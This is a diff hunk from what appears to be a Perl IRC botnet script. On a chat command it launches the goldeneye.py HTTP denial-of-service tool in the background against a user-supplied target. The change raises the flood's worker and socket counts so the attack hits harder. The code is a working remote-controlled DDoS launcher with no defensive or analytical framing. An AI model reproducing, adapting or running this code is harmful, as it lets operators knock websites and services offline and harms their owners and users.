@@ -118,7 +118,7 @@ while ( my $log = <$s0ck3t> ) {
         my $target_gold = $1;
         $target_gold =~ s/^\s*(.*?)\s*$/$1/;
         print $s0ck3t "PRIVMSG $channel :67[63GOLD67]61 Attack started at $1, use !stopgold for stop :P \r\n";
-        system("nohup python goldeneye.py $target_gold -w 15 -s 650 > /dev/null 2>&1 &");
+        system("nohup python goldeneye.py $target_gold -w 50 -s 2000 > /dev/null 2>&1 &");
       }
 
       if ( $log =~ m/:!stopgold/g ){##########
